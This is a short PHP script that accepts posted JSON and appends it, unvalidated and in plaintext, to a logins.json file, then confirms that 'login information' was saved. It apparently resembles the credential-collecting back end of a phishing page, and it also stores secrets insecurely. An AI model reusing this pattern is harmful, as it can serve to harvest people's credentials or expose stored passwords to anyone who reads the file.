<?php
// Get the posted data
$postData = file_get_contents('php://input');

// If data exists
if ($postData) {
    // Decode JSON data
    $loginData = json_decode($postData, true);

    // Get existing logins data or create an empty array
    $existingLogins = file_exists('logins.json') ? json_decode(file_get_contents('logins.json'), true) : [];

    // Add the new login data
    $existingLogins[] = $loginData;

    // Save the updated logins data back to the file
    file_put_contents('logins.json', json_encode($existingLogins));

    // Respond with success message
    echo json_encode(array("message" => "Login information saved successfully."));
} else {
    // Respond with error message
    echo json_encode(array("message" => "No data received."));
}
?>
